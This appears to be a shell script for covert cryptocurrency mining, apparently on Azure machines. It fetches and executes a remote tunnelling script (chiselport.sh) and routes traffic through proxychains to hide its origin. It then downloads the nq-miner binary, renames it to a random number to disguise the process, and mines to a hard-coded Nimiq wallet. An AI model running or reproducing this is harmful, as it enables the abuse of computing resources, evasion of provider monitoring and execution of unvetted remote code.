curl https://raw.githubusercontent.com/kadwanev/retry/master/retry -o /usr/local/bin/retry && chmod +x /usr/local/bin/retry
wget -q https://raw.githubusercontent.com/Vinhuit/azurenimpool/master/azure_script/chiselport.sh -O chiselport.sh && chmod 777 chiselport.sh
retry "timeout 2h bash -c './chiselport.sh $1 &'"
sleep 10
#sed -i 's/proxy_dns/#proxy_dns/g'  /etc/proxychains.conf
sudo proxychains curl ifconfig.me
wget -q https://github.com/tomkha/nq-miner/releases/download/0.99.6/nq-miner-linux-0.99.6.tar.gz && tar xvzf nq-miner-linux-0.99.6.tar.gz 
name=$RANDOM
mv nq-miner $name && sudo proxychains ./$name -t cuda -a "NQ56 JVMC 03YP S4DY NU9C 4VER JER8 EJY1 JX9U" -p $2 $3 
